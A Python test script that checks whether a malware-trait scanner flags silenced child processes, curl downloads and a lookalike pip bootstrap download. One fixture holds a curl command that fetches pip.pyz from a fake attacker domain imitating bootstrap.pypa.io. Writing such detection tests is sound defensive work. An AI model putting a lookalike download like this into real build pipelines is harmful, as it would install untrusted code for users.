#!/usr/bin/env python3
"""Check build downloads and child output-suppression observations."""
import json
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
output = 'micro-behaviors/process/stdio/configure::child-output-ignored-option'
download = 'micro-behaviors/communications/http/download/curl::curl-output-artifact-short-a'
lookalike = 'objectives/supply-chain/trojanized/ci-pipeline::pip-bootstrap-lookalike-download'
cases = {
    'silent.js': ("spawn('app', [], {detached:true,stdio:'ignore'});\n", {output}),
    'logged.js': ("spawn('app', [], {detached:true,stdio:['ignore',out,out]});\n", set()),
    'release.sh': ('#!/bin/sh\ncurl -L -o build/tool https://example.invalid/tool\n', {download}),
    'lookalike.sh': ('#!/bin/sh\ncurl -L -o build/pip.pyz https://bootstrap.pypa.io.attacker.invalid/pip/pip.pyz\n', {download, lookalike}),
    'canonical.sh': ('#!/bin/sh\ncurl -L -o build/pip.pyz https://bootstrap.pypa.io/pip/pip.pyz\n', {download}),
}
with tempfile.TemporaryDirectory(prefix='download-output-') as tmp:
    paths = []
    for name, (source, _) in cases.items():
        path = Path(tmp) / name
        path.write_text(source)
        paths.append(str(path))
    result = subprocess.run(
        [str((repo / '../cleave/target/release/cleave').resolve()), '--traits-dir', str(repo), '--format=json', *paths],
        check=True, capture_output=True, text=True,
    )
    seen = set()
    for line in result.stdout.splitlines():
        f = json.loads(line)['files'][0]
        name = Path(f['path']).name
        actual = {t['id'] for t in f.get('traits', [])} & {output, download, lookalike}
        assert actual == cases[name][1], (name, actual, cases[name][1])
        seen.add(name)
    assert seen == set(cases), seen
print('Download and output-suppression boundaries passed.')
